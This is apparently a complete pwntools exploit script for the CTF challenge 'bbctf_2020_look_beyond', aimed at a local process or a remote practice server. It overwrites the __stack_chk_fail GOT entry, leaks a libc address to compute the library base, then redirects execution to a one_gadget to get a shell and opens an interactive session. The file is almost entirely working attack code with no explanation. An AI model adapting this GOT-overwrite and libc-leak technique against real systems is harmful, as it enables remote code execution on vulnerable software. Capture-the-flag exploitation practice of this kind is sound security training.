#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./bbctf_2020_look_beyond')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./bbctf_2020_look_beyond')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',25977)
			elf=ELF('./bbctf_2020_look_beyond')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('Your choice:','1')
			io.sendlineafter('size?>',str(a))
			io.sendafter('content:',b)

		def edit(a,b):
			io.sendlineafter('Your choice:','2')
			io.sendlineafter('Index:',str(a))
			io.sendafter('content:',b)

		def show(a):
			io.sendlineafter('Your choice:','3')
			io.sendlineafter('Index:',str(a))

		def delete(a):
			io.sendlineafter('Your choice:','4')
			io.sendlineafter('Index:',str(a))


		io.recv()
		io.sendline(str(0x21000))
		io.recv()
		io.sendline(str(0x234dc))
		io.recv()
		io.send(str(elf.got['__stack_chk_fail']))
		io.recv()
		io.send(p64(0x00000000004007d6))
		io.recvuntil('0x')
		libc_base=int(io.recvline(),16)-libc.sym['puts']
		libc.address=libc_base
		ld.address=libc_base+0x3F1000
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		io.sendline(str(0x21000))
		io.recv()
		io.sendline(str(0x234dc+0x22000-1))
		io.recv()
		io.send(str(elf.got['__stack_chk_fail']))
		io.recv()
		io.send(p64(libc_base+one_gadget[1]))
		

		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		# success('heap_base:'+hex(heap_base))
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue